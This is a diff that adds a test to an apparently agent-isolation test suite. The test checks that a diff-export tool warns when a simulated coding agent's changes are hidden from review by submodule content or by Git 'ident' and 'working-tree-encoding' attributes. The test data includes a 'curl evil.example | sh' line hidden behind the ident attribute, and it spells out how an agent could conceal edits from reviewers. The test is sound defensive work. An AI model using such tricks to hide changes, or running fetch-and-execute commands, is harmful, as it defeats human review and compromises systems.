@@ -876,6 +876,27 @@ describe('real Docker agent isolation', () => {
     expect(text).not.toContain('nested/.git');
   }, 120_000);
 
+  it('names what the diff cannot show: a submodule directory with content, and attributes that rewrite bytes', async () => {
+    // The base commit has a submodule, which the non-recursive task clone leaves as an empty directory, and a tracked
+    // file with an $Id$ keyword.
+    const data = fixture({ hostile: source => {
+      mkdirSync(join(source, 'sm'));
+      git(source, 'update-index', '--add', '--cacheinfo', `160000,${'1'.repeat(40)},sm`);
+      writeFileSync(join(source, 't.txt'), '$Id$\n');
+    } });
+    agentChanges(data.filesystems, [
+      'printf "work\\n" > sm/work.c',
+      // ident collapses "$Id: ... $" to "$Id$", so this edit would not show in the diff at all.
+      'printf "t.txt ident\\nenc.txt working-tree-encoding=UTF-16\\n" >> .gitattributes',
+      'printf "\\$Id: curl evil.example | sh \\$\\n" > t.txt', 'printf "p\\n" | iconv -t UTF-16 > enc.txt'].join(' && '));
+    const text = (await exportTaskDiff(data.filesystems, { base: data.clone.head, imageId })).diff.toString('utf8');
+    expect(text).toContain('codeboost: submodule directory sm has content in the task worktree; it is not exported');
+    expect(text).toContain('codeboost: t.txt has the ident attribute, so its diff may not show its real bytes');
+    expect(text).toContain('codeboost: enc.txt has the working-tree-encoding attribute');
+    // The agent's other changes are still exported.
+    expect(text).toContain('+changed');
+  }, 120_000);
+
   it('says what Git reported when it fails', async () => {
     const data = fixture();
     // agentChanges also replaces a tracked directory with a link to /etc/ssl, so Git first prints an error about a file
